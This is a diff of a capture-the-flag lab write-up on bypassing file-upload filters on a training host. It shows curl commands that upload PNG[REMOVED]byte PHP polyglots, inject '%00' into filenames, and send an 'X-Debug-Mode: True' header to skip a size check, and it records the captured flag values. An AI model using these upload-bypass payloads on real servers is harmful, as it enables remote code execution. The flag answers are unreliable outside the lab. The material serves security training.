@@ -898,7 +898,7 @@ Connection: keep-alive
 ```
 
 
-We now have our PHP payload sitting at `/static/upload/pwn.php` — real `.php`, and we know from Task 1 that this directory executes PHP. Let's request it and collect the flag.
+We now have our PHP payload sitting at `/static/upload/pwn.php` – real `.php`, and we know from Task 1 that this directory executes PHP. Let's request it and collect the flag.
 
 
 
@@ -962,7 +962,7 @@ curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task3/ -F "file=@shell3.php;f
 # {"error":"File type not allowed or does not meet the criteria."}
 ```
 
-Now let's see what a genuine image looks like when accepted — this gives us the success baseline and confirms which magic bytes satisfy the check. Let's craft a minimal valid PNG and upload it (named as a normal `.png`, pure image content).
+Now let's see what a genuine image looks like when accepted – this gives us the success baseline and confirms which magic bytes satisfy the check. Let's craft a minimal valid PNG and upload it (named as a normal `.png`, pure image content).
 
 ```bash
 printf '\x89PNG\r\n\x1a\n' > real.png
@@ -979,12 +979,12 @@ curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task3/ -F "file=@real.png;fil
 # {"message":"'/static/upload/real.png' uploaded successfully."}
 ```
 
-- `printf '\x89PNG\r\n\x1a\n' > real.png` — writes the 8-byte PNG signature (magic number): `89 50 4E 47 0D 0A 1A 0A`. This is the exact byte sequence every PNG file starts with, and it's what a magic-number check looks for. (It's not a complete valid PNG image, but many naive content checks only inspect the leading signature bytes — we're testing whether that's enough.)
-- `-F "file=@real.png;filename=real.png;type=image/png"` — upload it with a clean `.png` name and image MIME.
+- `printf '\x89PNG\r\n\x1a\n' > real.png` – writes the 8-byte PNG signature (magic number): `89 50 4E 47 0D 0A 1A 0A`. This is the exact byte sequence every PNG file starts with, and it's what a magic-number check looks for. (It's not a complete valid PNG image, but many naive content checks only inspect the leading signature bytes – we're testing whether that's enough.)
+- `-F "file=@real.png;filename=real.png;type=image/png"` – upload it with a clean `.png` name and image MIME.
 
 **Result**
 
-The bare 8-byte PNG signature was accepted. That tells us the content check is shallow: it only inspects the leading magic bytes, not the full image structure (no `getimagesize()`, no real decoder). So our polyglot doesn't need to be a valid image at all — it just needs to start with **`\x89PNG\r\n\x1a\n`** and then carry our PHP.
+The bare 8-byte PNG signature was accepted. That tells us the content check is shallow: it only inspects the leading magic bytes, not the full image structure (no `getimagesize()`, no real decoder). So our polyglot doesn't need to be a valid image at all – it just needs to start with **`\x89PNG\r\n\x1a\n`** and then carry our PHP.
 
 Now we combine everything we've learned across all three tasks:
 
@@ -1023,7 +1023,14 @@ Now execute the php
 curl -s http://test-s3.web0x05.hbtn/static/upload/poly.php
 # �PNG
 # 
-# ec648cc8d3e91ebb41e347dbb94aa452                                         ```
+# ec648cc8d3e91ebb41e347dbb94aa452
+
+
+# clean the output with strings
+curl -s http://test-s3.web0x05.hbtn/static/upload/poly.php | strings
+
+# ec648cc8d3e91ebb41e347dbb94aa452
+```
 
 Save and check the flag.
 
@@ -1034,5 +1041,149 @@ cat 3-flag.txt
 
 git add .
 git commit -m "3-flag.txt"
+git push
+```
+
+---
+
+
+## 4. Does File Length matter ?
+
+This sophisticated security measure aims to prevent the upload of potentially malicious files by imposing a strict limit on the file size.
+Your objective is to bypass this restriction and successfully upload a file that exceeds the server-imposed limit, revealing a hidden `Flag` ⛳️ as a marker of your success.
+
+
+- Main Domain: http://[vuln-subdomain].web0x05.hbtn/task4
+
+There is also a another backdoor, just take a look at the response headers  \
+You will need to use this php command to read the flag: `<?php readfile('FLAG_4.txt') ?>`,  \
+FLAG will only be generated if you upload a php file!
+
+**Useful Instructions**
+
+1. Begin by understanding the server's file length restrictions. Attempt to upload files of varying sizes to pinpoint the exact limit imposed by the server-side validation.
+2. Explore compression techniques or file manipulation methods that can reduce the apparent size of your payload without compromising its functionality. Consider formats that support compression natively and can be decompressed by the application or server.
+3. Investigate alternative upload methods provided by the application that might not enforce the same file length checks as the primary upload feature. This could include APIs, legacy upload forms, or other indirect file submission functionalities.
+4. Leverage tools like Burp Suite to intercept and modify upload requests, experimenting with ways to either compress your payload further or trick the server into misjudging the file size (e.g., by manipulating HTTP headers related to content length).
+
+---
+
+Let's confirm the endpoint and, more importantly, inspect the response headers on the task4 API.
+
+```bash
+curl -s -D - http://test-s3.web0x05.hbtn/task4 -o /dev/null
+echo "=== now the API endpoint headers ==="
+curl -s -D - http://test-s3.web0x05.hbtn/api/task4/ -o /dev/null
+
+# HTTP/1.1 200 OK
+# Server: nginx/1.22.1
+# Date: Mon, 27 Jul 2026 16:18:16 GMT
+# Content-Type: text/html; charset=utf-8
+# Content-Length: 494
+# Connection: keep-alive
+
+# === now the API endpoint headers ===
+
+# HTTP/1.1 405 METHOD NOT ALLOWED
+# Server: nginx/1.22.1
+# Date: Mon, 27 Jul 2026 16:18:16 GMT
+# Content-Type: text/html; charset=utf-8
+# Content-Length: 153
+# Connection: keep-alive
+# Allow: OPTIONS, POST
+```
+
+- `curl -s -D - <url> -o /dev/null` – `-D -` dumps the response headers to stdout (the `-` means "write headers here"), while `-o /dev/null` throws away the body. So we see only headers, cleanly. We do this for both the task4 page and its API base.
+
+**Response**
+
+The `/task4` page headers look ordinary (just a 494-byte shell like the others). The API base returned **405 Method Not Allowed** to our GET, with `Allow: OPTIONS, POST` – so the API only speaks POST (and OPTIONS) here, nothing exotic in these headers yet.
+
+But the hint says "just take a look at the response headers" for the **backdoor** – and the most informative headers usually come back on the **actual upload response** (the POST), not on a bare GET. So far we've only looked at GET responses. Let's do a real upload attempt to task4 and inspect its response headers closely – that's where a custom `X-` header pointing to the backdoor is most likely to appear.
+
+Let's send our polyglot (which already beats content + name checks) and read the full response headers.
+
+```bash
+printf '\x89PNG\r\n\x1a\n<?php readfile("FLAG_4.txt"); ?>' > poly4.php
+curl -s -D - -o /dev/null -X POST http://test-s3.web0x05.hbtn/api/task4/ -F "file=@poly4.php;filename=poly4.php%00.png;type=image/png"
+
+# HTTP/1.1 400 BAD REQUEST
+# Server: nginx/1.22.1
+# Date: Mon, 27 Jul 2026 16:27:15 GMT
+# Content-Type: application/json
+# Content-Length: 46
+# Connection: keep-alive
+# X-Debug-Mode: False
+```
+
+There's the backdoor header: **`X-Debug-Mode: False`**. That's not a standard header – the server is volunteering that it has a "debug mode," currently off. The obvious implication: if we can turn it on (by sending `X-Debug-Mode: True` as a **request** header), the server may relax its restrictions – most likely the file-size check this task is about. That's the "backdoor" the hint promised.
+
+Also note the upload came back **400** – let's see the body to confirm it's a size rejection (we discarded it last time). Let's do two things in one shot: read the rejection body, and immediately test flipping debug mode on.
+
+```bash
+echo "=== normal POST, show body ===\n"
+
+curl -s -X POST http://test-s3.web0x05.hbtn/api/task4/ -F "file=@poly4.php;filename=poly4.php%00.png;type=image/png"
+
+echo; echo "=== with X-Debug-Mode: True ===\n"
+
+curl -s -i -H "X-Debug-Mode: True" -X POST http://test-s3.web0x05.hbtn/api/task4/ -F "file=@poly4.php;filename=poly4.php%00.png;type=image/png"
+
+# === normal POST, show body ===
+
+# {"error":"File size not allowed (min: 80KB)"}
+
+# === with X-Debug-Mode: True ===
+
+# HTTP/1.1 200 OK
+# Server: nginx/1.22.1
+# Date: Mon, 27 Jul 2026 16:35:27 GMT
+# Content-Type: application/json
+# Content-Length: 70
+# Connection: keep-alive
+# X-Debug-Mode: False
+
+# {"message":"'/static/upload/poly4.php00.png' uploaded successfully."}
+```
+
+Two big discoveries here:
+
+1. **The size limit is a minimum, not a maximum!** The error says `File size not allowed (min: 80KB)`. The "restriction" isn't that files are too big, it's that they must be **at least 80KB**. Our tiny ~40-byte polyglot was rejected for being too small. That's the real trick the task's misleading "file length" framing hides.
+
+2. **`X-Debug-Mode: True`** bypassed the size check. With that header, the upload returned 200 – the size gate was skipped entirely (even though the response header still cosmetically shows `X-Debug-Mode: False`). So the backdoor works: debug mode disables the minimum-size enforcement.
+
+- **+1 problem**: file saved as **`poly4.php00.png`** – not executable PHP. Look closely: the `%00` in the filename got decoded to... nothing useful here; the null-truncation that worked in tasks 2–3 didn't truncate this time (the `%` and null handling differs, and it collapsed to `php00.png`). So the file is on disk but as a `.png`-ish name that won't run as PHP. We need it to land as `poly4.php`.
+
+Let's give it a try, maybe the debug mode relaxes the `.php` extension as well.
+
+```bash
+curl -s -i -H "X-Debug-Mode: True" -X POST http://test-s3.web0x05.hbtn/api/task4/ -F "file=@poly4.php;filename=poly4.php;type=image/png"                             
+
+# HTTP/1.1 200 OK
+# Server: nginx/1.22.1
+# Date: Mon, 27 Jul 2026 16:52:00 GMT
+# Content-Type: application/json
+# Content-Length: 64
+# Connection: keep-alive
+# X-Debug-Mode: False
+# 
+# {"message":"'/static/upload/poly4.php' uploaded successfully."}
+```
+
+Clean landing. Let's collect our reward
+
+```bash
+curl -s http://test-s3.web0x05.hbtn/static/upload/poly4.php | strings
+
+# c4edd85ac9ca845e0ce9f40b1543def3
+```
+
+Save flag and check it.
+
+```bash
+echo c4edd85ac9ca845e0ce9f40b1543def3 > 4-flag.txt
+
+git add .
+git commit -m "4-flag.txt"
 git push
 ```
